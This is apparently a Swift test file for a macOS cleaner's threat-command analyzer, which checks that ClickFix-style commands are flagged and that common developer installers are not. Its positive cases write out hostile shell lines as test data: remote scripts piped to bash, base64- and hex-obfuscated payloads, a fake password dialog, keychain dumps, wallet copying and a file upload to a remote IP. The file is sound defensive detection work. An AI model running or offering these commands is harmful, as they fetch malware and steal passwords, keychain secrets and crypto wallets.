import Foundation
import Testing
@testable import MacCleanerKit

@Suite("Threat command analyzer")
struct ThreatCommandAnalyzerTests {
    private func rules(_ text: String) -> [ThreatRule: ThreatSeverity] {
        Dictionary(ThreatCommandAnalyzer.analyze(text).map { ($0.rule, $0.severity) }, uniquingKeysWith: { a, _ in a })
    }

    // MARK: ClickFix one-liners (positive)

    @Test func clickFixBashSubstitutionOverHTTPIsHigh() {
        let cmd = #"/bin/bash -c "$(curl -fsSL http://45.94.47.112/install.sh)""#
        #expect(rules(cmd)[.remoteScriptToShell] == .high)
    }

    @Test func clickFixPipeToBackgroundedShellIsHigh() {
        let cmd = "curl -s https://macos-update-check.com/d/x9 | nohup bash >/dev/null 2>&1 &"
        #expect(rules(cmd)[.remoteScriptToShell] == .high)
    }

    @Test func bareHostWithoutSchemeIsHigh() {
        #expect(rules("curl -s cloudfix-verify.com/v | zsh")[.remoteScriptToShell] == .high)
    }

    @Test func insecureFlagIsHigh() {
        #expect(rules("curl -kfsSL https://example.org/a.sh | sh")[.remoteScriptToShell] == .high)
    }

    @Test func unknownHTTPSVendorScriptIsMediumOnly() {
        #expect(rules("curl -fsSL https://get.somevendor.dev/install.sh | bash")[.remoteScriptToShell] == .medium)
    }

    @Test func obfuscatedBase64ClickFixIsHighAndDecoded() {
        let inner = "curl -s http://185.11.22.33/p.sh | bash"
        let blob = Data(inner.utf8).base64EncodedString()
        let findings = ThreatCommandAnalyzer.analyze("echo \"\(blob)\" | base64 -d | bash")
        #expect(findings.contains { $0.rule == .encodedPayloadToShell && $0.severity == .high })
        #expect(findings.contains { $0.rule == .remoteScriptToShell && $0.decoded && $0.severity == .high })
    }

    @Test func decodeInsideShellSubstitution() {
        let blob = Data("osascript -e 'display dialog \"x\" default answer \"\" with hidden answer'".utf8).base64EncodedString()
        let findings = rules("sh -c \"$(echo \(blob) | base64 --decode)\"")
        #expect(findings[.encodedPayloadToShell] == .high)
        #expect(findings[.fakePasswordPrompt] == .high)
    }

    @Test func quoteAndIFSObfuscationIsSeen() {
        #expect(rules(#"c""u''rl${IFS}-s${IFS}http://1.2.3.4/x|s\h"#)[.remoteScriptToShell] == .high)
        #expect(rules("curl -s \\\n  http://1.2.3.4/x \\\n | bash")[.remoteScriptToShell] == .high)
    }

    @Test func hexPayloadToShell() {
        #expect(rules(#"printf '\x63\x75\x72\x6c\x20\x2d\x73' | sh"#)[.encodedPayloadToShell] == .high)
        let hex = Data("curl http://9.9.9.9/x | sh".utf8).map { String(format: "%02x", $0) }.joined()
        #expect(rules("echo \(hex) | xxd -r -p | sh")[.encodedPayloadToShell] == .high)
    }

    @Test func fakePasswordDialog() {
        let script = #"osascript -e 'set p to text returned of (display dialog "macOS needs your password to continue" default answer "" with icon caution with hidden answer)'"#
        #expect(rules(script)[.fakePasswordPrompt] == .high)
    }

    @Test func dsclAuthOnlyIsHighAndPasswordMasked() {
        let findings = ThreatCommandAnalyzer.analyze("dscl . -authonly alice hunter2secret")
        let hit = findings.first { $0.rule == .passwordVerification }
        #expect(hit?.severity == .high)
        #expect(hit?.snippet.contains("hunter2secret") == false)
        #expect(hit?.snippet.contains("alice") == true)
    }

    @Test func stagingAndUpload() {
        let script = """
        ditto -c -k --sequesterRsrc --keepParent "$HOME/stolen" /tmp/out.zip
        curl -X POST -F "file=@/tmp/out.zip" http://91.1.2.3/upload
        """
        #expect(rules(script)[.stagingUpload] == .high)
    }

    @Test func quarantineStripAndRunFromTmp() {
        let cmd = "curl -o /tmp/update https://x.example/u && xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update"
        #expect(rules(cmd)[.payloadDropExecute] == .high)
    }

    @Test func keychainDumpAndBrowserSafeStorage() {
        #expect(rules("security dump-keychain -d login.keychain")[.keychainExtraction] == .high)
        #expect(rules("security find-generic-password -wa 'Chrome'")[.keychainExtraction] == .high)
        #expect(rules(#"security find-generic-password -s "Brave Safe Storage" -w"#)[.keychainExtraction] == .high)
    }

    @Test func walletCollectionWithArchive() {
        let script = #"""
        cp -R "$HOME/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" /tmp/w/
        cp -R "$HOME/Library/Application Support/atomic" /tmp/w/
        """#
        let hit = ThreatCommandAnalyzer.analyze(script).first { $0.rule == .credentialHarvest }
        #expect(hit?.severity == .high)
        #expect(hit?.snippet.contains("MetaMask") == true)
    }

    // MARK: Developer commands (negative)

    @Test(arguments: [
        "brew install ripgrep",
        "brew services start postgresql@16",
        "curl -fsSL https://example.com/file.tar.gz -o file.tar.gz",
        "curl -s https://api.github.com/repos/x/y | jq .",
        "curl -s https://api.example.com/v1 | python3 -m json.tool",
        "npm i",
        "pnpm install --frozen-lockfile",
        "git clone https://github.com/apple/swift.git",
        "docker compose up -d",
        "codex --help",
        "xattr -cr /Applications/SomeOSSApp.app",
        "xattr -d com.apple.quarantine ~/Downloads/tool.dmg",
        "security find-generic-password -s openai-api -w",
        "echo $TOKEN | base64 -d | jq",
        "zip -r project.zip src",
        "chmod +x ./build.sh && ./build.sh",
        "cat ~/.ssh/id_ed25519.pub | pbcopy",
        "ditto -c -k --keepParent MyApp.app MyApp.zip",
    ])
    func benignDeveloperCommand(_ cmd: String) {
        #expect(ThreatCommandAnalyzer.analyze(cmd).isEmpty, "flagged: \(cmd)")
    }

    /// The official Homebrew installer *is* remote code piped into a shell.
    /// It is allowlisted (exact host raw.githubusercontent.com + path
    /// /Homebrew/install/, https only), so it produces no finding; a
    /// different repo on the same host is still reported.
    @Test func homebrewInstallerIsAllowlisted() {
        let brew = #"/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""#
        #expect(ThreatCommandAnalyzer.analyze(brew).isEmpty)
        let lookalike = #"/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/homebrew-fix/install/HEAD/install.sh)""#
        #expect(rules(lookalike)[.remoteScriptToShell] == .medium)
        let http = #"/bin/bash -c "$(curl -fsSL http://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""#
        #expect(rules(http)[.remoteScriptToShell] == .high)
    }

    @Test(arguments: [
        "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash",
        "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
        "curl -fsSL https://get.pnpm.io/install.sh | sh -",
        "curl -fsSL https://bun.sh/install | bash",
        "curl -LsSf https://astral.sh/uv/install.sh | sh",
        "curl -fsSL https://claude.ai/install.sh | bash",
        #"sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)""#,
    ])
    func knownInstallersAreAllowlisted(_ cmd: String) {
        #expect(ThreatCommandAnalyzer.analyze(cmd).isEmpty, "flagged: \(cmd)")
    }

    @Test func secretMasking() {
        let masked = SecretMasker.mask("curl -H 'Authorization: Bearer abc.def.ghi' https://u:pw@x.io?token=s3cr3t ghp_ABCDEFGHIJKLMNOPQRSTUVWX")
        #expect(!masked.contains("abc.def.ghi"))
        #expect(!masked.contains("s3cr3t"))
        #expect(!masked.contains(":pw@"))
        #expect(!masked.contains("ghp_ABCDEFGHIJ"))
    }
}
